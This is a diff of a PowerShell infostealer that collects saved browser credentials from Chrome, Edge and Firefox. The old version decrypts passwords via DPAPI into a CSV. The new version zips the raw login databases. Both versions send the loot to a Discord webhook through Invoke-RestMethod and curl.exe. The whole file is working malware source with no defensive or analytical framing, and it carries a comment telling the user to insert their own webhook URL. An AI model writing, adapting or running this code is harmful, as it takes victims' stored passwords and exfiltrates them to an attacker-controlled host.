@@ -1,85 +1,91 @@
-function Get-BrowserSavedPasswords {
+function Collect-Credentials {
+    $chromeLoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+    $firefoxProfilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
+    $firefoxLoginData = "$firefoxProfilePath\*\logins.json"
+    $edgeLoginData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
+    $outputPath = "C:\temp\credential.zip"  # Update the output path to C:\temp
 
-    [CmdletBinding()]
-    param (	
-        [Parameter(Position=1, Mandatory=$true)]
-        [string]$Browser
-    ) 
+    # Create a temporary directory to store the login data files
+    $tempDir = New-Item -ItemType Directory -Path (Join-Path $env:TEMP "CredentialTemp") -Force
 
-    if ($Browser -eq 'chrome') {
-        $Path = "$Env:LocalAppData\Google\Chrome\User Data\Default\Login Data"
-    }
-    elseif ($Browser -eq 'firefox') {
-        $ProfilesPath = "$Env:AppData\Mozilla\Firefox\Profiles"
-        $ProfileFolder = Get-ChildItem -Path $ProfilesPath | Select-Object -First 1 -ExpandProperty Name
-        $Path = "$ProfilesPath\$ProfileFolder\logins.json"
-    }
-    elseif ($Browser -eq 'edge') {
-        $Path = "$Env:LocalAppData\Microsoft\Edge\User Data\Default\Login Data"
-    }
+    try {
+        # Copy Chrome login data
+        Copy-Item -Path $chromeLoginData -Destination $tempDir.FullName -Force -ErrorAction Stop
 
-    $Passwords = @()
-    if (Test-Path -Path $Path) {
-        $Database = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList "Data Source=$Path;Version=3;New=False;Compress=True;"
-        $Database.Open()
-        $Command = $Database.CreateCommand()
-        $Command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-        $Reader = $Command.ExecuteReader()
+        # Copy Edge login data
+        Copy-Item -Path $edgeLoginData -Destination $tempDir.FullName -Force -ErrorAction Stop
 
-        while ($Reader.Read()) {
-            $OriginURL = $Reader.GetValue(0)
-            $Username = [System.Text.Encoding]::UTF8.GetString($Reader.GetValue(1))
-            $Password = [System.Security.Cryptography.ProtectedData]::Unprotect($Reader.GetValue(2), $null, 'CurrentUser')
-            $Passwords += [PSCustomObject]@{
-                User = $env:UserName
-                Browser = $Browser
-                OriginURL = $OriginURL
-                Username = $Username
-                Password = $Password
+        # Check if Firefox profiles directory exists
+        if (Test-Path -Path $firefoxProfilePath) {
+            # Copy Firefox login data
+            $firefoxProfiles = Get-ChildItem -Path $firefoxProfilePath -Directory
+            foreach ($profile in $firefoxProfiles) {
+                $loginDataPath = Join-Path $profile.FullName "logins.json"
+                if (Test-Path -Path $loginDataPath) {
+                    Copy-Item -Path $loginDataPath -Destination $tempDir.FullName -Force -ErrorAction Stop
+                }
             }
         }
+        else {
+            Write-Host "Firefox profiles directory not found. Skipping Firefox credentials collection." -ForegroundColor Yellow
+        }
 
-        $Reader.Close()
-        $Database.Close()
+        # Delete existing zip file if it exists
+        if (Test-Path -Path $outputPath -PathType Leaf) {
+            Remove-Item -Path $outputPath -Force
+        }
+
+        # Zip the collected login data
+        Write-Host "Zipping the collected login data..."
+        Compress-Archive -Path $tempDir\* -DestinationPath $outputPath -Force
+
+        Write-Host "Credentials collected and zipped successfully at: $outputPath"
+
+        # Return the path to the zip file
+        $outputPath
     }
-
-    $Passwords
+    catch {
+        Write-Host "An error occurred while collecting credentials: $_" -ForegroundColor Red
+    }
+    finally {
+        # Clean up the temporary directory
+        Remove-Item -Path $tempDir.FullName -Recurse -Force
+    }
 }
 
-$ChromePasswords = Get-BrowserSavedPasswords -Browser 'chrome'
-$FirefoxPasswords = Get-BrowserSavedPasswords -Browser 'firefox'
-$EdgePasswords = Get-BrowserSavedPasswords -Browser 'edge'
+# Call the function to collect and zip the credentials, and store the output path
+$zipFilePath = Collect-Credentials
 
-$AllPasswords = $ChromePasswords + $FirefoxPasswords + $EdgePasswords
-$AllPasswords | Export-Csv -Path "$env:TMP\--BrowserPasswords.csv" -NoTypeInformation
-
-#------------------------------------------------------------------------------------------------------------------------------------
+$webhookUrl = "https://discord.com/api/webhooks/WEBHOOK_ID/TOKEN"  # Replace with your Discord webhook URL
+$fileToUpload = 'C:\temp\credential.zip'
 
 function Upload-Discord {
+    [CmdletBinding()]
+    param (
+        [parameter(Position=0, Mandatory=$False)]
+        [string]$file,
+        [parameter(Position=1, Mandatory=$False)]
+        [string]$text 
+    )
 
-[CmdletBinding()]
-param (
-    [parameter(Position=0,Mandatory=$False)]
-    [string]$file,
-    [parameter(Position=1,Mandatory=$False)]
-    [string]$text 
-)
+    $hookurl = $webhookUrl
 
-$hookurl = "$dc"
+    $Body = @{
+        'username' = $env:username
+        'content' = $text
+    }
 
-$Body = @{
-  'username' = $env:username
-  'content' = $text
+    if (-not ([string]::IsNullOrEmpty($text))) {
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
+    }
+
+    # Upload the file to Discord using curl.exe
+    if (-not ([string]::IsNullOrEmpty($file))) {
+        $curlArgs = "-F", "file1=@$file"
+        & curl.exe $curlArgs $hookurl
+    }
 }
 
-if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
-
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+if (-not ([string]::IsNullOrEmpty($fileToUpload))) {
+    Upload-Discord -file $fileToUpload
 }
-
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\--BrowserData.txt}
-
-
-############################################################################################################################################################
-RI $env:TEMP/--BrowserData.txt
